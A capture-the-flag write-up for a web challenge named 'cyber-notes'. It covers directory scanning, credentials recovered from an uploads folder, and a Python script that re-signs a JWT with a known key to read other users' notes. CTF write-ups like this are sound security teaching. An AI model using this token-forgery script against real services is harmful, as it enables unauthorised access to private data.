# CyberNotes Write-Up

## Tools Used
- **Kali Linux**
- **dirsearch**
- **Burp Suite**

---

## Step 1 - Reconnaissance

### Initial Observations
- Used the **Network** tab in the browser's **Inspect Element** to observe network activity of the original site `cyber-notes/live`.
- Attempted to download all files from the website using:
  ```bash
  wget -m [website URL]
  ```
  This was done to analyze the files for any hidden resources.

### Directory Scanning
- Switched to **dirsearch** and found some hidden directories such as:
  - `/#/register`
  - `/#/uploads`

### Vulnerability Discovery
- Observed the `index.js` file.
- Noticed a potential vulnerability involving the usage of **localStorage tokens** (most secure implementations use HttpOnly cookies).

---

## Step 2 - Attack Approach

### Exploitation
1. **Credentials Extraction**
   - Found a username and password in the `/uploads` directory:
     - **Username:** `D3aDs0ck`
     - **Password:** `bluM#_M@y_N3vr`

2. **JWT Token Exploitation**
   - Exploited the vulnerability of the **JWT token** by crafting a fake token.
   - Used **Burp Suite** to intercept the real token for further analysis.

---

## Step 3 - Decryption and Attack Code

### Code
```python
import jwt
import json
import requests

USERNAME = "D3aDs0ck"
PASSW = "bluM#_M@y_N3vr"
KEY = "H6jga21h1"

# URL of the target
URL = "https://cyber-notes.chalz.nitectf2024.live/"

print("USERNAME:", USERNAME)
print("PASSWORD:", PASSW)
print("JWT KEY:", KEY)
print("URL:", URL)

# Get fake JWT
data = json.dumps({
    "username": USERNAME,
    "password": PASSW
})
response = requests.request(
    "POST", URL + "api/login", data=data, headers={'Content-Type': 'application/json'})

fake_token = json.loads(response.text)["token"]
print("FAKE TOKEN:", fake_token)

# Decode fake JWT and sign it with the real key
decoded = jwt.decode(fake_token, options={"verify_signature": False})
new_token = jwt.encode(decoded, KEY, algorithm='HS256')
print("REAL TOKEN:", new_token)

# Use the real token to fetch notes
response = requests.request("GET", URL + "api/notes",
                            headers={'Authorization': "Bearer " + new_token})

print(response.text)
```

---
